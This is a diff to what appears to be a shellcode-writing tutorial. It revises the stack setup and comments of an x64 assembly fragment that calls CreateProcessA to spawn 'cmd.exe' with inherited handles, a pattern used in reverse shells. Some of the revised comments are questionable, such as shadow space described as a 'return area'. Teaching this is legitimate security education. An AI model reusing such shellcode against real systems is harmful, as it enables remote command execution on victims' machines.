@@ -181,20 +181,20 @@ In this structure, only a few fields really matter.  The rest we simply make NUL
 ```nasm
     ; Call CreateProcessA
     mov rax, rsp                ; Get current stack pointer
-    sub rax, 0x500              ; Setup space on the stack for holding process info
-    push rax                    ; ProcessInfo
-    push rdi                    ; StartupInfo -> Pointer to STARTUPINFOA
+    sub rax, 0x18               ; Setup space on the stack for holding process info
+    push rax                    ; Address of the ProcessInformation structure | 10th parameter
+    push rdi                    ; Address of the STARTUPINFOA structure | 9th parameter
     xor rax, rax
-    push rax                    ; lpCurrentDirectory
-    push rax                    ; lpEnvironment
-    push rax                   
+    push rax                    ; lpCurrentDirectory | 8th parameter
+    push rax                    ; lpEnvironment | 7th parameter
+    push rax                    ; dwCreationFlags | 6th parameter
     inc rax
-    push rax                    ; bInheritHandles -> 1
+    push rax                    ; bInheritHandles -> 1 | 5th parameter
     xor rax, rax
-    push rax                    ; hStdInput = NULL
-    push rax                    ; hStdOutput = NULL
-    push rax                    ; hStdError = NULL
-    push rax                    ; dwCreationFlags
+    push rax                    ; Reserve space for the function return area | 4th parameter
+    push rax                    ; Reserve space for the function return area | 3rd parameter
+    push rax                    ; Reserve space for the function return area | 2nd parameter
+    push rax                    ; Reserve space for the function return area | 1st parameter
     mov r8, rax                 ; lpThreadAttributes            
     mov r9, rax                 ; lpProcessAttributes           
     mov rdx, rcx                ; lpCommandLine = "cmd.exe" 
